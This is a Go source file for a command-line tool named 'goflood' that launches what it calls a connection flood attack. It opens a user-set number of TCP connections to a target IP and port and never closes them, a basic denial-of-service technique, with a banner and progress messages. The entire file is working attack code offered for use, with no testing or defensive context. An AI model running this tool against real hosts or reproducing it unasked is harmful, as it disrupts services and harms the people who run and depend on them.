package main

// imported packages
import (
	"flag"
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"

	"github.com/fatih/color"
)

// variables
var (
	author  string
	version string = "1"

	targetPort    int
	numOfRequests int
	targetIP      string
)

/**
Banner Function

This prints the welcome banner / version number when application is launched
*/
func banner() {
	name := fmt.Sprintf("goflood (v.%s)", version)
	banner := `
  ________      ___________.__                    .___
 /  _____/  ____\_   _____/|  |   ____   ____   __| _/
/   \  ___ /  _ \|    __)  |  |  /  _ \ /  _ \ / __ | 
\    \_\  (  <_> )     \   |  |_(  <_> |  <_> ) /_/ | 
 \______  /\____/\___  /   |____/\____/ \____/\____ | 
        \/           \/                            \/ 
`

	// window width
	allLines := strings.Split(banner, "\n")
	w := len(allLines[1])

	// Centered
	fmt.Println(banner)
	color.Green(fmt.Sprintf("%[1]*s", -w, fmt.Sprintf("%[1]*s", (w+len(name))/2, name)))
	color.Blue(fmt.Sprintf("%[1]*s", -w, fmt.Sprintf("%[1]*s", (w+len(author))/2, author)))
	fmt.Println()
}

/**
Main Function

Entry point to application - takes targetIP, targetPort and numOfRequests as parameters
launches a connection flood attack against the specified target

*/
func main() {

	//Display Banner
	banner()

	//Capture arguments
	flag.StringVar(&targetIP, "targetIP", "127.0.0.1", "Target IP")
	flag.IntVar(&targetPort, "targetPort", 80, "Target Port")
	flag.IntVar(&numOfRequests, "numOfRequests", 1000, "Number of Requests")
	flag.Parse()

	//Launch connection flood attack
	connectionFlood(targetIP, targetPort, numOfRequests)
}

/**
Connection Flood Function
This function takes the targetIP (ip) , targetPort (port) & the number of requests (requests)

It will flood the target with connection requests
*/
func connectionFlood(ip string, port int, requests int) {

	//display attack information prior to launching attack
	fmt.Printf("Connection Food Attack Started against Target : %s \n", ip)
	fmt.Printf("on port  : %s \n", strconv.Itoa(port))
	fmt.Printf("sending: %s : requests \n", strconv.Itoa(requests))

	//setup loop for connection requests
	index := requests
	for index > 0 {

		//connects to the address on the target network
		_, err := net.Dial("tcp", ip+":"+strconv.Itoa(port))

		//handle any error
		if err != nil {
			//log error - port closed
			log.Printf("Port %s closed", strconv.Itoa(port))

		} else {
			//print sent connection request
			fmt.Printf("Connection request sent to port %s \n", strconv.Itoa(port))
		}

		//decrement number of requests by 1
		index--
	}

	//print that attack is complete
	fmt.Printf("%s requests sent \n", strconv.Itoa(requests))
	fmt.Printf("Connection Flood Attack Complete against %s ", targetIP+":"+strconv.Itoa(port))
}
